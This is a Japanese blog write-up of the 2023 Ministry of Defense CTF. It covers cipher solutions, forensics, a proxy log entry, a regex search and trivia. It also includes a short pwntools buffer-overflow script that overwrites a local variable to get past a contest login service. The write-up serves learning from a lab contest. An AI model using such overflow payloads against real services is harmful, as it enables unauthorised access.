+++
title = "防衛省サイバーコンテスト2023 writeup"
date = "2023-8-6"
description = "2023/8/6似開催された防衛省サーバーコンテストのwriteupです。"
draft = false
header_img = ""
toc = true
tags = ["CTF","writeup"]
comment = true
+++

2023年8月6日に行われた防衛省が主催のCTF大会、防衛省サーバーコンテストに参加しました。  
難易度は中級〜上級といったところでしょうか。様々なジャンルの問題がありました。  
個人的には初めてPWNの問題を解くことができてめちゃくちゃ嬉しかったです。    
ただ、終了時間と同時に問題文すら見れなくなってしまったので、もう少し解けなかった問題の復習ができる時間とかを確保してくれたらとても嬉しかったです。  
wirteup用の問題文のスクショとかも撮ってなかったので、とっても簡易的なものになってます。

## CRYPT
### Simple Substitution Cipher
ROT13でした。

### Substitution Cipher
ヴィジュネル暗号でした。
問題文にあった、`ggcp{wIR2AuVebMyR}`は`flag{*******}`となるので鍵は`bvcj`となることがわかりました。

## Forensics
### The Place of The First Secret Meeting
画像が与えられます。問題文からてっきり後ろのマンションの名前を入れればいいと勘違いしてたのですが、どでかく存在しているやぐらの名前を入れれば良かったことに気づきました笑
→うしとらやぐら

### The Deleted Confidential File
vhdファイルが与えられます。
`Autopsy`を使ってvhdファイルを読み込んでみると、削除済みの一覧に`重要.zip`が見つかりました。バイナリファイルで見てみるとフラグが隠れていました。


## NW
### Analysis
2023/4/7 12:26:25,119970,10.200.200.15,TCP_TUNNEL/200,8099213,CONNECT,amazon_co_jp.ipa-info.net:22,HIER_DIRECT/2.57.80.99,-


## PROGRAMING
### Regex Exercise
`grep -E 'flag{Regexp.!![0-9]{2}S' regex-flags.txt `
としたら４択まで絞れました。

## TRIVIA
### Threat
ChatGPTに問題文を丸投げしたら答えてくれました。

### Behavior
同じくChatGPT

### Inventor
同じくChatGPT

## PWN
### Auth
はじめてPWNが解けました！  
めちゃくちゃ嬉しかったです。  
問題としてはBOFでローカル変数を書き換える問題。  
以下のようなコードを書きました。
```python
from pwn import *

ip = '10.10.10.15'
port = 1001
payload = b'a'*26
payload += p64(0x65757274)

r = remote(ip, port)

print(r.recvuntil(b'User: '))
usr = p64(0x6e696d6461)
print(r.sendline(usr))

print(r.recvuntil(b'Password: '))
print(r.sendline(payload))

res = r.recvall()
print(res)
```

## Web
### Basic
パケットキャプチャが与えられます。
TCPストリームの６番でBasic認証に `200 OK`を返している。

